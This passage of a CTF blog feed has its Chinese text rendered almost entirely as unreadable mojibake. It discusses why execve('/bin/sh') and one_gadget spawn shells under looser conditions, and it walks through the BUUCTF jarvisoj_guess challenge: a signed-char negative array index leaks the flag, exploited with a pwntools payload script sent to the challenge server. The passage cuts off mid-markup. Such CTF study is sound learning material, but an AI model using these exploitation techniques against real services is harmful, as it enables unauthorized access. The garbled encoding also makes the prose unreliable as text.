src="/../img/2706180-20220628230347653-575952863.png"></p><p>å‘ç°[rsp+0x30]å¤„å±…ç„¶ä¸ä¸º0ï¼Œä½†æ˜¯å´èƒ½æˆåŠŸè·å–shellï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="/../img/2706180-20220628230402532-554880588.png"></p><p>æƒ³è§£é‡Šè¿™ä¸ªåŸå› ï¼Œè¿˜è¦ä»execveå‡½æ•°ä¸‹æ‰‹ã€‚</p><p>é€šå¸¸æˆ‘ä»¬è®¤ä¸ºè·å–shellå°±è¦å†™æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,0,0)æ‰å¯ä»¥ï¼Œä½†æ˜¯åä¸¤ä¸ªå‚æ•°çœŸçš„ä¸€å®šè¦ä¸º0ä¹ˆï¼Ÿ</p><p><img src="/../img/2706180-20220628230420596-268174659.png"></p><p>å®ƒè¿™æ®µç¬¬ä¸€å¥çš„æ„æ€å°±æ˜¯è¯´argvæ˜¯ä¸ªä¼ é€’æ–°ç¨‹åºçš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œè¯´å®è¯è¿™å¥æˆ‘ç†è§£ä¹Ÿä¸æ˜¯å¤ªæ·±ï¼Œä½†æ˜¯èƒ½è·å–åˆ°ä¸¤ä¸ªä¿¡æ¯ã€‚<strong>é¦–å…ˆè¿™ä¸ªargvæ•°ç»„é‡Œé¢è£…çš„æ˜¯æŒ‡é’ˆï¼ˆå› ä¸ºå®é™…ä¸Šæ˜¯æŒ‡é’ˆæŒ‡å‘äº†å­—ç¬¦æ•°ç»„(å­—ç¬¦ä¸²ä½¿ç”¨å­—ç¬¦ä¸²æ•°ç»„è¿›è¡Œå­˜å‚¨)çš„åœ°å€ï¼‰ï¼Œå…¶æ¬¡è¿™ä¸ªæ•°ç»„è¦ä»¥NULLç»“å°¾ï¼Œenvpå‚æ•°ä¹Ÿæ˜¯ä¸€æ ·ã€‚</strong></p><p><strong>ä¹Ÿå°±æ˜¯è¯´åªè¦argvè¿™ä¸ªåœ°æ–¹é‡Œé¢æ”¾äº†ä¸ªæŒ‡é’ˆå¹¶ä¸”æ˜¯NULLç»“å°¾ï¼Œè‡³äºæŒ‡é’ˆæŒ‡å‘çš„æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²å·²ç»æ— æ‰€è°“äº†ï¼Œè€Œæ­¤æ—¶çš„æƒ…å†µå°±æ˜¯argvé‡Œé¢æ”¾äº†ä¸ªæŒ‡é’ˆï¼Œå¹¶ä¸”æ˜¯NULLç»“å°¾(å¦‚ä¸‹å›¾)</strong></p><p><img src="/../img/2706180-20220628230432185-381323556.png"></p><p>è™½ç„¶è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ˜¯æ•°å­—1ï¼Œä¸è¿‡ä¾ç„¶æœ€ç»ˆä¹Ÿå¯ä»¥è·å–shellã€‚</p><p>åŒæ—¶ä¹Ÿå¯ä»¥åšä¸€ä¸ªå°æµ‹è¯•,å°±æ˜¯å°†argvé‡Œé¢æ”¾ä¸ªIntç±»å‹çš„æŒ‡é’ˆï¼ŒæŒ‡å‘æ•´æ•°ï¼Œçœ‹çœ‹execveå‡½æ•°è¿˜èƒ½å¦è·å–shellã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> arg, <span class="type">char</span> **args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    p=&amp;a;</span><br><span class="line">    <span class="type">char</span> *argv[]=&#123;p,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220628230451741-973872450.png"></p><p>å‘ç°æ˜¯æˆåŠŸçš„åˆå¼€å¯äº†ä¸€ä¸ªshellã€‚</p><blockquote><p>å› æ­¤å¾—å‡ºç»“è®ºï¼Œone_gadgetçš„ç”Ÿæ•ˆæ¡ä»¶æ˜¯è·å–shellçš„å……åˆ†æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´è·å–shellä¸ä¸€å®šè¦æ»¡è¶³one_gadgetçš„æ¡ä»¶ã€‚</p></blockquote><p>ä¸ºä»€ä¹ˆrealloc+1å’Œrealloc+3ä¹Ÿèƒ½è·å–shellå‘¢ï¼Ÿ</p><p>é€šè¿‡è°ƒè¯•å‘ç°realloc+1å’Œrealloc+3å¼€å§‹æ‰§è¡Œçš„è¯ï¼Œæ‰§è¡Œçš„å¹¶ä¸æ˜¯æ­£ç¡®çš„æœºå™¨ç <strong>ï¼Œè€Œæ˜¯æœºå™¨ç è¿›è¡Œäº†é”™ä½ã€‚ä¸è¿‡æ­£å¥½é”™ä½ä¹‹åï¼Œä¾ç„¶æ˜¯ä¸ªpushæŒ‡ä»¤ï¼Œå¯¼è‡´äº†realloc+1å…¶å®å’Œreallocçš„æ ˆä¸­æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œè€Œrealloc+3å’Œrealloc+2çš„æ ˆä¸­æƒ…å†µæ˜¯ä¸€æ ·çš„</strong>ã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220628230506076-1711403249.png"></p><p>ç”±æ­¤å¯è§ï¼Œå³ä½¿æœºå™¨ç é”™ä½ï¼Œä½†pushæŒ‡ä»¤ä¾ç„¶æ²¡å˜ï¼Œä»…ä»…å˜çš„æ˜¯pushåé¢çš„å¯„å­˜å™¨ã€‚æ‰€ä»¥å¹¶ä¸æ”¹å˜æ ˆå¸§</p>]]></content>
      
      
      <categories>
          
          <category> æ¢ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reallocè°ƒæ•´æ ˆå¸§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_jarvisoj_guess</title>
      <link href="/posts/992e244b.html"/>
      <url>/posts/992e244b.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼šï¼ˆè¯´å®è¯ï¼Œæˆ‘æŠŠè¿™ç©æ„æ‹–åˆ°IDAé‡Œçš„ä¸€åˆ»ï¼Œæˆ‘æ˜¯æƒ³ç›´æ¥æŠŠå®ƒæ‰”è¿›å›æ”¶ç«™çš„ï¼Œä¸è¿‡æœ€ç»ˆè¿˜æ˜¯ç¡¬ç€å¤´çš®åšä¸‹æ¥äº†ï¼Œæ”¶è·ä¹ŸçœŸçš„å¾ˆå¤šï¼‰</p><p>1ã€è¿™é“é¢˜çš„æ¼æ´ç‚¹æ˜¯æ•°ç»„ä¸‹æ ‡çš„ä¸æ£€æŸ¥ï¼Œå¯¼è‡´charç±»å‹å¯èƒ½è‡ªèº«å˜æˆè´Ÿæ•°ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸æ­£å¸¸æ•°æ®æ¥é€šè¿‡å¯¹flagçš„æ£€æŸ¥ã€‚</p><p>2ã€ä½¿ç”¨å•å­—èŠ‚çˆ†ç ´çš„æ‰‹æ®µï¼Œè·å–flagï¼Œè¿™é“é¢˜å¯¹äºflagçš„æ£€æŸ¥æ˜¯åˆ¤æ–­æ•´ä½“çš„ï¼Œä½†ä¹‹æ‰€ä»¥å¯ä»¥è¿›è¡Œå•å­—èŠ‚çˆ†ç ´æ˜¯å› ä¸ºæˆ‘ä»¬æ˜¯å…ˆé€šè¿‡äº†flagçš„æ£€æŸ¥ï¼Œç„¶åä¾æ¬¡æ”¹å˜ä¸€å­—èŠ‚ï¼Œæ¥è§‚å¯Ÿå›æ˜¾ï¼Œæˆ‘ä»¬çš„flagæ˜¯å¦æ­£ç¡®ï¼Œä»è€Œè¿›è¡Œå•å­—èŠ‚çš„çˆ†ç ´ã€‚å¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªå‰ææ˜¯ä¸é™æ¬¡æ•°çš„è¾“å…¥å†…å®¹ï¼ˆåªè¦å†…å®¹æ˜¯100å­—èŠ‚ï¼Œå°±å¯ä»¥ä¸flagè¿›è¡Œæ¯”è¾ƒåˆ¤æ–­ï¼‰</p><p>3ã€å½“æ—¶å…³äºæœ¬æœºçš„flagå’Œè¿œç¨‹çš„flagè¿™é‡Œè¿·äº†å¥½ä¹…ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæœ¬æœºçš„æ˜¯å‡flagï¼Œç„¶åè¿œç¨‹æ˜¯é€šè¿‡æŸç§åŠ å¯†æ‰‹æ®µæ”¾çš„æ˜¯çœŸflagï¼ˆæ„æ€å°±æ˜¯è¯´æœ¬æœºflagå’Œè¿œç¨‹flagæˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æœ‰å…³ç³»çš„ï¼‰ï¼Œæœ€åçœ‹äº†ä¸‹å‰é¢çš„è‹±æ–‡æç¤ºï¼Œåˆæƒ³äº†å¾ˆä¹…æœ€åå‘ç°ï¼Œè¿™ä¿©flagä¹‹é—´å¹¶æ²¡æœ‰ä»»ä½•å…³ç³»â€¦</p><p>4ã€æˆ‘ä»¬å§‹ç»ˆéƒ½æ²¡æ³•ç›´æ¥æ§åˆ¶value_1å’Œvalue_2çš„å€¼ï¼Œæˆ‘ä»¬ä»…ä»…åªèƒ½å»æ§åˆ¶bin_by_hexæ•°ç»„çš„ç´¢å¼•ï¼Œè€Œæˆ‘ä»¬çˆ†ç ´çš„å…¶å®æ˜¯bin_by_hexæ•°ç»„çš„ä¸‹æ ‡ï¼Œè€ŒçœŸæ­£çš„flagæ˜¯é€šè¿‡è¿™ä¸ªä¸‹æ ‡å»æ•°ç»„bin_by_hexé‡Œé¢æ‰¾åˆ°çœŸæ­£flagçš„æ‰€å¯¹åº”çš„å­—ç¬¦ã€‚ä¹‹æ‰€ä»¥ç»™æˆ‘ä»¬ä¸€ç§çˆ†ç ´flagçš„é”™è§‰å…¶å®æ˜¯å› ä¸ºçˆ†ç ´çš„bin_by_hexæ•°ç»„ä¸‹æ ‡æ­£å¥½åˆæ˜¯å¯¹åº”å­—ç¬¦çš„asciiï¼ˆæ¯”å¦‚æˆ‘çˆ†ç ´bçš„æ—¶å€™ï¼Œåˆ†åˆ«å‘äº†6å’Œ2ï¼Œè¿™ä¸ª0x62å…¶å®æ˜¯bin_by_hexçš„ä¸‹æ ‡ï¼Œä½†æ˜¯è¿™ä¸ªä¸‹æ ‡æ”¾çš„åˆæ­£å¥½æ˜¯bï¼‰å› æ­¤å°±æ„Ÿè§‰æˆ‘ä»¬åœ¨çˆ†ç ´flagä¸€æ ·ã€‚å…³äºè¿™ä¸ªbin_by_hexæ•°ç»„ä¸å®ƒçš„ä¸‹æ ‡è¿™é‡Œï¼Œæˆ‘è¿·äº†å¾ˆä¹…ã€‚</p><p>5ã€è¿™é“é¢˜æœ€åçš„çˆ†ç ´è„šæœ¬æˆ‘æ„Ÿè§‰è¿˜æ˜¯éœ€è¦ä¸€äº›pythonåŠŸåº•æ‰èƒ½å†™å‡ºæ¥çš„ï¼ˆæˆ‘æ˜¯çœ‹äº†ä¸‹å¸ˆå‚…ä»¬çš„ expæ‰å†™å‡ºæ¥çš„ï¼‰</p><p>6ã€è¿™é“é¢˜æœ€æ¶å¿ƒçš„åœ°æ–¹å°±æ˜¯è°ƒè¯•å¾ˆéº»çƒ¦ï¼ˆå…¶å®æˆ‘å‹æ ¹å°±ä¸ä¼šâ€¦ï¼‰ï¼Œè€Œä¸”å¯¹äºè¿™é“é¢˜è°ƒè¯•è€Œè¨€çš„è¯ï¼Œä¹Ÿä¸çŸ¥é“è°ƒè¯•è¯¥çœ‹ä»€ä¹ˆï¼Œåˆæ˜¯è¦è¿æ¥çš„ï¼Œåˆæ˜¯forkçš„ï¼Œç¡®å®ä¸ä¼šè°ƒâ€¦</p><p>7ã€ç†Ÿæ‚‰äº†ä¸€ä¸‹å¸¸è§ç½‘ç»œç¼–ç¨‹å‡½æ•°çš„åŠŸèƒ½ï¼Œç”¨IDAç®€å•å¯¹ä»–ä»¬è¿›è¡Œäº†æµç¨‹çš„åˆ†æã€‚</p><h1 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h1><p><img src="/../img/2706180-20220407213934511-1318458791.png"></p><h1 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h1><h2 id="å…³äºsocketç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ"><a href="#å…³äºsocketç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ" class="headerlink" title="å…³äºsocketç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ"></a>å…³äºsocketç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ</h2><p>ç”±äºä¸€æ‰“å¼€ç¨‹åºçœ‹åˆ°çš„å°±æ˜¯socketç½‘ç»œç¼–ç¨‹çš„é‚£äº›å‡½æ•°ï¼Œä¸è¿‡è¿™äº›éƒ½å’Œè¿™é“é¢˜æ²¡æœ‰å…³ç³»ï¼Œ<strong>å…³äºè¿™äº›å‡½æ•°æˆ‘å°†æ”¾åœ¨æ–‡ç« çš„æœ€ååˆ†æï¼Œä¸‹é¢ç›´æ¥å¼€å§‹ä¸Šæ­£ç‰‡ã€‚</strong></p><h2 id="é‡è¦çš„è‹±æ–‡æç¤º"><a href="#é‡è¦çš„è‹±æ–‡æç¤º" class="headerlink" title="é‡è¦çš„è‹±æ–‡æç¤º"></a>é‡è¦çš„è‹±æ–‡æç¤º</h2><p>è¿™ä¸ªç¨‹åºçš„å…¥æ‰‹ç‚¹ï¼Œå…¶å®æ˜¯äººå®¶ç»™å‡ºæ¥çš„æç¤ºã€‚</p><p><img src="/../img/2706180-20220407213941932-45079530.png"></p><p>ä¸Šé¢è¿™å››è¡Œè¯å¾ˆå…³é”®ï¼Œè¦æ˜¯ä¸æ³¨æ„çš„è¯ï¼Œå…¶å®æ˜¯å¾ˆéš¾ç†è§£è¿™é“é¢˜ç›®ã€‚</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯è¯´ï¼Œç°åœ¨ä½ æœ¬åœ°çš„è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªæµ‹è¯•ç¨‹åºï¼Œåœ¨è¿™ä¸ªæµ‹è¯•ç¨‹åºé‡Œé¢çš„flagï¼Œæ˜¯ä»¥FAKE{å¼€å§‹çš„ï¼Œå…¶å®ä½ å¯ä»¥å‘ç°ï¼Œ<strong>æœ¬æœºä¸Šçš„flagï¼Œidaæ‰“å¼€ä¹‹åå°±ç›´æ¥çœ‹è§äº†</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜æœ¬æœºä¸Šçš„flagä½ æ˜¯å¯ä»¥çœ‹è§çš„ï¼Œä½†æ˜¯ç¬¬å››è¡Œè¯´äº†ï¼Œ<strong>å…·æœ‰real flagçš„ç¨‹åºæ˜¯è¿è¡Œåœ¨æœåŠ¡å™¨é‚£è¾¹çš„</strong>ï¼Œå®ƒæ˜¯ä»¥PCTF{å¼€å¤´çš„ï¼Œå¹¶ä¸”æ˜¯50ä¸ªå­—ç¬¦  ï¼ˆä½†æ˜¯è¿™é“é¢˜æˆ‘æ˜¯ä»BUUCTFä¸Šåšçš„ï¼Œå› æ­¤buuä¸ŠæœåŠ¡å™¨é‚£è¾¹çš„flagä¾ç„¶æ˜¯ä»¥flag{å¼€å¤´çš„ï¼‰</p><p>ä¸€å¥è¯æ€»ç»“å°±æ˜¯ï¼Œ<strong>æœ¬æœºä¸Šçš„flagä½ èƒ½çœ‹è§ï¼ŒæœåŠ¡å™¨é‚£è¾¹è¿è¡Œçš„è¿™ä¸ªç¨‹åºåŒæ ·çš„ä½ç½®ä¹Ÿæœ‰ä¸€ä¸ªflagï¼ˆå’Œä½ æœ¬æœºä¸Šçš„flagä¸ä¸€æ ·ï¼‰ä½ çœ‹ä¸è§ï¼Œä½†æ˜¯ä½ è¦æƒ³åŠæ³•çŸ¥é“å®ƒã€‚</strong> </p><h2 id="ä¸€ä¸ªå¥‡æ€ªçš„è´Ÿæ•°ç´¢å¼•"><a href="#ä¸€ä¸ªå¥‡æ€ªçš„è´Ÿæ•°ç´¢å¼•" class="headerlink" title="ä¸€ä¸ªå¥‡æ€ªçš„è´Ÿæ•°ç´¢å¼•"></a>ä¸€ä¸ªå¥‡æ€ªçš„è´Ÿæ•°ç´¢å¼•</h2><p><img src="/../img/2706180-20220407213951129-1415363463.png"></p><p>å¯ä»¥å‘ç°æ•´ä¸ªç¨‹åºçš„æ¼æ´ç‚¹åœ¨è¿™ä¸ªå‡½æ•°é‡Œã€‚</p><p><img src="/../img/2706180-20220407214000770-1049221226.png"></p><p>é¦–å…ˆçœ‹è¿™ä¸ªåœ°æ–¹ï¼Œæ•°ç»„é‡Œé¢çš„ä¸‹æ ‡ç´¢å¼•å€¼åˆæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¯å¾ˆå®¹æ˜“å‡ºç°é—®é¢˜çš„ï¼Œå†ä»”ç»†åˆ†æä¸€ä¸‹ï¼Œæ•°ç»„é‡Œé¢çš„é‚£ä¸ªæ•°ç»„ï¼ˆå…¶å®ä¹Ÿä¸æ˜¯æ•°ç»„ï¼Œåªæ˜¯ä¸ªä»¥ç´¢å¼•æ–¹å¼æ¥æ£€ç´¢çš„ä¸€ä¸ªcharæŒ‡é’ˆï¼‰ï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯ä¸ªcharç±»å‹çš„ï¼Œcharç±»å‹çš„æ€ä¹ˆå¯ä»¥ä½œä¸ºä¸‹æ ‡å‘¢ã€‚</p><p><strong>charç±»å‹çš„å€¼å¼ºè½¬ä¸ºintç±»å‹ä¹‹åï¼Œè¶…è¿‡127çš„è¯ï¼Œåˆ™ä¼šå˜æˆè´Ÿæ•°</strong></p><p>å†™ä¸ªè„šæœ¬éªŒè¯ä¸€ä¸‹</p><p><img src="/../img/2706180-20220407214009412-961119144.png"></p><p>å› ä¸ºæˆ‘ä»¬å¯ä»¥æ§åˆ¶flag_hexçš„å€¼ï¼Œè€Œè¿™ä¸ªå€¼æˆ‘ä»¬è¿˜å¯ä»¥è®©ä»–å¯æ­£å¯è´Ÿï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹ï¼Œå»è®©value_1å’Œvalue_2å¾—åˆ°ä¸€äº›ä¸æ­£å¸¸çš„æ•°æ®ï¼Œè¿™ä¸ªç‚¹æ”¾åœ¨è¿™é‡Œï¼Œç»§ç»­å¾€ä¸‹åˆ†æã€‚</p><h2 id="åˆ†æåˆå¹¶v1å’Œv2ä»¥åŠæ£€æŸ¥éƒ¨åˆ†"><a href="#åˆ†æåˆå¹¶v1å’Œv2ä»¥åŠæ£€æŸ¥éƒ¨åˆ†" class="headerlink" title="åˆ†æåˆå¹¶v1å’Œv2ä»¥åŠæ£€æŸ¥éƒ¨åˆ†"></a>åˆ†æåˆå¹¶v1å’Œv2ä»¥åŠæ£€æŸ¥éƒ¨åˆ†</h2><p><img src="/../img/2706180-20220407214015621-1417489823.png"></p><p>è¿™ä¸ªåœ°æ–¹ï¼Œå…¶å®æˆ‘è‡ªå·±æ²¡çœ‹æ˜ç™½ï¼Œä¸è¿‡æˆ‘åˆå†™äº†ä¸ªcçš„ç¨‹åºï¼Œæ¨¡æ‹Ÿäº†ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220407214021566-2083393784.png"></p><p>è¿™å›æ¯”è¾ƒæ¸…æ™°äº†ï¼Œvalue_1å’Œvalue_2ä¼šåˆæˆä¸€ä¸ªåå…­è¿›åˆ¶çš„å­—ç¬¦(enâ€¦ä¸Šé¢çš„value_aå°±æ˜¯æˆ‘è¯´çš„value_1ï¼Œå½“æ—¶è¿™é‡Œæ‰“é”™äº†ï¼‰ï¼Œå…¶ä¸­value_1æ˜¯é«˜ä½ï¼Œvalue_2æ˜¯ä½ä½ã€‚</p><p>ç„¶åå°±æ˜¯flag[i_0]ä¸given_flag[i_0]å»å¼‚æˆ–æ¯”è¾ƒï¼Œå¿…é¡»äºŒè€…ä½¿ç”¨ç›¸åŒï¼Œæœ€åçš„diffæ‰æ˜¯0ï¼Œå¦åˆ™diffä¸æ˜¯0ï¼ˆå› ä¸ºæœ‰ä¸ª|ï¼Œåªè¦ä¸€æ¬¡ä¸æ˜¯0ï¼Œä¹‹åè‡ªå·±å†å’Œè‡ªå·±|çš„è¯ï¼Œå°±æ°¸è¿œéƒ½å˜ä¸ä¼š0äº†ï¼‰</p><p>è€Œflag[i_0]é‡Œé¢è£…çš„å°±æ˜¯flagï¼ˆæœ¬æœºçš„è¯ï¼Œä½ æ˜¯å¯ä»¥ç›´æ¥çœ‹è§çš„â€¦ï¼Œä½†æ˜¯è¿œç¨‹é‚£è¾¹çš„flagä½ æ˜¯çœ‹ä¸è§çš„ï¼Œå®ƒè¢«å¤åˆ¶åˆ°äº†flag[i_0]é‡Œé¢ï¼‰</p><p>è€Œgiven_flag[i_0]åˆ™å¾ˆæœ‰æ„æ€ï¼Œå®ƒæ˜¯å‰é¢ä¸¤ä¸ªvalue_1å’Œvalue_2æ‹¼æˆçš„ä¸€ä¸ªå­—ç¬¦ï¼ˆæ‹¼æˆçš„æ˜¯ä¸ªåå…­è¿›åˆ¶æ•°å­—ç„¶åå¯¹åº”å…¶ASCIIç ï¼‰</p><h2 id="åˆ©ç”¨è´Ÿæ•°ç´¢å¼•"><a href="#åˆ©ç”¨è´Ÿæ•°ç´¢å¼•" class="headerlink" title="åˆ©ç”¨è´Ÿæ•°ç´¢å¼•"></a>åˆ©ç”¨è´Ÿæ•°ç´¢å¼•</h2><p>è€Œvalue_1å’Œvalue_2çš„å€¼åˆ™æ˜¯ä»bin_by_hexæ˜¯æ•°ç»„é‡Œé¢é ç´¢å¼•æ¥è·å–çš„ã€‚ä¸‹é¢æ˜¯bin_by_hexé‡Œé¢çš„å†…å®¹ï¼ˆæœªæˆªå…¨ï¼‰</p><p><img src="/../img/2706180-20220407214029281-12184470.png"></p><p>è¿™æ˜¯ï¼Ÿï¼Ÿï¼Ÿä¼¼ä¹æ„Ÿè§‰æœ‰ç‚¹ç¦»è°±ï¼Œä½†æ˜¯åˆ«å¿˜äº†ï¼Œæˆ‘ä»¬ä¸Šé¢æåˆ°äº†è¿™ä¸ªç´¢å¼•ä¹Ÿå¯ä»¥å–è´Ÿæ•°ï¼Œå› æ­¤çœ‹ä¸€ä¸‹æ ˆé‡Œçš„æƒ…å†µï¼ˆä¸Šå›¾åŸæœ¬æ˜¯æ•°æ®æ˜¯åœ¨dataæ®µï¼Œä½†æ˜¯è¿™ä¸²æ•°æ®è¢«qmemcpyå‡½æ•°æ‹·è´åˆ°äº†æ ˆé‡Œï¼Œè€Œä¾é ç´¢å¼•æ¥æ‰¾æ•°æ®æ˜¯åœ¨æ ˆä¸­å®ç°çš„ï¼‰<br><img src="/../img/2706180-20220407214036994-1443796803.png"></p><p>å‘ç°äº†flagï¼ˆflagä¹Ÿè¢«qmemcpyå‡½æ•°æ‹·è´åˆ°äº†æ ˆä¸­ï¼‰ï¼Œå±…ç„¶å°±åœ¨bin_by_hexçš„ä¸Šé¢è€Œä¸”è·ç¦»ä»…ä»…åªæœ‰0x40ä¸ªå­—èŠ‚ã€‚é‚£æˆ‘ä»¬é€šè¿‡è´Ÿæ•°çš„ç´¢å¼•å²‚ä¸æ˜¯å°±å¯ä»¥å¾ˆé¡ºåˆ©çš„å°†given_flag[i_0]è®¾ç½®ä¸ºflagã€‚æˆ‘ä»¬å°†value_1å»è®¾ç½®ä¸º0ï¼ˆå› ä¸ºå®ƒä¹˜äº†ä¸ª16ï¼Œä¸å¤ªå¥½æ§åˆ¶ï¼ŒæŠŠå®ƒè®¾ç½®ä¸º0ä¹‹åï¼Œåªéœ€è¦æ§åˆ¶ä¸€ä¸ªvalue_2å³å¯ï¼‰ï¼Œè®©value_2å»ä¸ºflagçš„å­—ç¬¦å³å¯ã€‚<strong>ä¸è¿‡æˆ‘ä»¬æœ€ç»ˆçˆ†ç ´çœŸçš„flagçš„æ—¶å€™ï¼Œæ˜¯éœ€è¦åˆ†åˆ«æ§åˆ¶value_1å’Œvalue_2</strong></p><h2 id="å…³äºå°†value-1è®¾ç½®ä¸º0è¿™ä»¶äº‹"><a href="#å…³äºå°†value-1è®¾ç½®ä¸º0è¿™ä»¶äº‹" class="headerlink" title="å…³äºå°†value_1è®¾ç½®ä¸º0è¿™ä»¶äº‹"></a>å…³äºå°†value_1è®¾ç½®ä¸º0è¿™ä»¶äº‹</h2><p>å› ä¸ºæˆ‘ä»¬æœ€åå‘é€çš„è‚¯å®šæ˜¯å­—ç¬¦0ï¼Œå¯¹åº”çš„ASCIIç åº”è¯¥æ˜¯0x30ï¼ˆå› ä¸ºcharç±»å‹è¢«ä½œä¸ºæ•°ç»„ä¸‹æ ‡çš„æ—¶å€™ï¼Œä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆintç±»å‹ï¼‰ï¼Œå› æ­¤å»bin_by_hexé‡Œé¢æ‰¾ä¸€ä¸‹0x30çš„ç´¢å¼•ã€‚</p><p><img src="/../img/2706180-20220407214046292-2046277629.png"></p><p>å‘ç°æ˜¯0ï¼ˆè¿™ä¸ª0å¯æ˜¯intç±»å‹çš„ï¼‰ï¼Œå› æ­¤åœ¨given_flag[i] &#x3D; value2 | (16 * value1);è¿™æ­¥çš„æ—¶å€™ï¼Œgiven_flag[i]çš„å€¼å°±å®Œå…¨å–å†³äºvalue_2äº†</p><h1 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h1><h2 id="è®¡ç®—è´Ÿæ•°ç´¢å¼•"><a href="#è®¡ç®—è´Ÿæ•°ç´¢å¼•" class="headerlink" title="è®¡ç®—è´Ÿæ•°ç´¢å¼•"></a>è®¡ç®—è´Ÿæ•°ç´¢å¼•</h2><p>æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹è¿™ä»¶äº‹æƒ…ï¼Œé¦–å…ˆæˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸€å®šè¦è®©å…¶å€¼ä¸ºè´Ÿæ•°ï¼ˆå› ä¸ºæˆ‘ä»¬éœ€è¦è¿™ä¸ªè´Ÿæ•°ç´¢å¼•ï¼‰ï¼Œè€Œè¿™ä¸ªè´Ÿæ•°çš„ç´¢å¼•åº”è¯¥æ˜¯è¦ä»-64å¼€å§‹é€æ¸å‡å°ï¼ˆå› ä¸ºè¿™ä¸ªç´¢å¼•å–å¾—çš„å†…å®¹è·ç¦»bin_by_hexæ˜¯è¶Šæ¥è¶Šè¿‘çš„ï¼‰</p><p><img src="/../img/2706180-20220407214054522-409297233.png"></p><p>å†æ¬¡è¿è¡Œä¸€ä¸‹cå†™çš„ç¨‹åºï¼Œå‘ç°åªè¦æˆ‘ä»¬è¾“å…¥192ï¼Œcharè¢«ä½œä¸ºç´¢å¼•æ—¶ï¼Œä¼šè‡ªåŠ¨è½¬æ¢æˆintç±»å‹ï¼Œè€Œå€¼ä¸º-64.ä¾æ¬¡ç±»æ¨ï¼Œæˆ‘ä»¬éœ€è¦50ä¸ªè¿™æ ·çš„ç´¢å¼•ï¼Œå› ä¸ºflagæ˜¯50ä¸ªå­—ç¬¦ã€‚</p><p>æˆ‘ä»¬ç”¨pythonè„šæœ¬æ¥å®ç°ä¸€ä¸‹è¿™ä»¶äº‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)<span class="comment">#ç¬¬ä¸€æ¬¡è¾“å…¥å­—ç¬¦0ï¼Œè®©value_1çš„å€¼ä¸º0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åâ€¦</p><p><img 